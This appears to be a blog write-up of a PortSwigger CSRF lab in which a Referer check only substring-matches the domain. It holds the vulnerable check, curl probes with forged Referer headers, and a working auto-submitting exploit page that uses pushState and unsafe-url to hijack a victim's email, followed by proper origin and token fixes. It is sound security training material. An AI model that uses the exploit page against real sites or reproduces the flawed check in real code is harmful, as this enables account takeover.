---
layout: post
title: "PortSwigger: CSRF with Broken Referer Validation"
date: 2027-11-08 09:00:00 -0500
categories: [Web Security, CSRF]
tags: [portswigger, csrf, referer, substring-match, pushstate, referrer-policy, web]
---

## Lab Summary

**Lab:** CSRF with broken Referer validation
**Difficulty:** Practitioner
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html) – Cross-Site Request Forgery
**Result:** Solved

---

## The Vulnerability

The email-change endpoint is protected by a `Referer` check instead of a CSRF token — but the check is broken. Rather than validating that the `Referer`'s **origin** is the lab domain, it only checks whether the lab domain appears **anywhere in the Referer string**:

```js
if (!req.headers.referer || !req.headers.referer.includes('TARGET')) {
  return res.status(400).send('Invalid Referer');
}
db.updateEmail(req.session.userId, req.body.email);
```

A substring match is not an origin check. Any URL that contains the target domain somewhere in it — even as a query string on a completely different host — satisfies the guard.

---

## Why It Works

The browser derives the `Referer` header from the current document's URL, and an attacker controls their own page's URL. Two mechanisms combine:

1. **`history.pushState('', '', '/?TARGET')`** rewrites the exploit page's own URL (path + query) client-side *without navigating*. The browser then builds the outgoing `Referer` for the cross-origin form POST from this rewritten URL, so it reads `https://attacker-host/?TARGET` — which contains the target domain as a substring and passes the broken check.

2. **`Referrer-Policy: unsafe-url`** is mandatory. Modern browsers default to `strict-origin-when-cross-origin`, which strips the query string from the `Referer` on cross-origin navigation. That would silently remove the `?TARGET` part and defeat the bypass. `unsafe-url` forces the full URL — including the query string — to be sent.

---

## Solution

**Step 1 — Probe the endpoint** (two requests distinguish a substring match from a real origin check):

```bash
# Wholly wrong domain → 400 (validation exists)
curl -sk -b cookies.txt -X POST 'https://TARGET/my-account/change-email' \
  -H 'Referer: https://arbitrary-incorrect-domain.net/' \
  -d 'email=probe@evil.com' -o /dev/null -w '%{http_code}'
# → 400

# Wrong host, but target domain in the query string → 302 (bypass confirmed)
curl -sk -b cookies.txt -X POST 'https://TARGET/my-account/change-email' \
  -H 'Referer: https://arbitrary-incorrect-domain.net/?TARGET' \
  -d 'email=probe@evil.com' -o /dev/null -w '%{http_code}'
# → 302
```

A 302 on the second probe confirms the server checks `Referer.contains(target-domain)` rather than validating the actual origin.

**Step 2 — Build the exploit page** and host it on the exploit server. Add a `Referrer-Policy: unsafe-url` header to the response:

```html
<html>
  <body>
    <script>history.pushState('', '', '/?TARGET')</script>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

`pushState` rewrites the page URL so its query string carries the lab domain; the form auto-submits cross-origin with the victim's session cookie attached; and the leaked `Referer` (`https://exploit-server/?TARGET`) passes the flawed substring check.

**Step 3 — Deliver to victim.**

The victim's browser loads the page, `document.forms[0].submit()` fires automatically, and the email change goes through — the forged Referer containing the lab domain as a substring is accepted.

---

## Why It Worked

The developer reduced "did this request come from our site?" to "does our domain appear in the Referer string?" That is trivially true for `https://evil.com/?our-domain.com`. Combined with `pushState` (to plant the domain in the attacker page's own query string) and `Referrer-Policy: unsafe-url` (to stop the browser from stripping that query string cross-origin), the attacker produces a Referer that both looks foreign and contains the target domain — exactly what a substring check fails to catch.

---

## Fix / Defense

**Validate the Referer's actual origin**, not a substring — parse the URL and compare the `origin`:

```js
const ref = new URL(req.headers.referer || 'https://x.invalid');
if (ref.origin !== 'https://TARGET') {
  return res.status(400).send('CSRF check failed');
}
```

A domain buried in a query string no longer matches — only a `Referer` whose scheme + host + port equal the target passes.

**Better: use a synchronizer CSRF token.** A per-session, per-request opaque token embedded in the form cannot be forged or smuggled into a header:

```js
if (!req.body.csrf || req.body.csrf !== req.session.csrfToken) {
  return res.status(403).send('CSRF token required');
}
```

Validating the `Origin` header (parsed as an origin, not substring-matched) is worthwhile defence-in-depth, but tokens are the primary control.
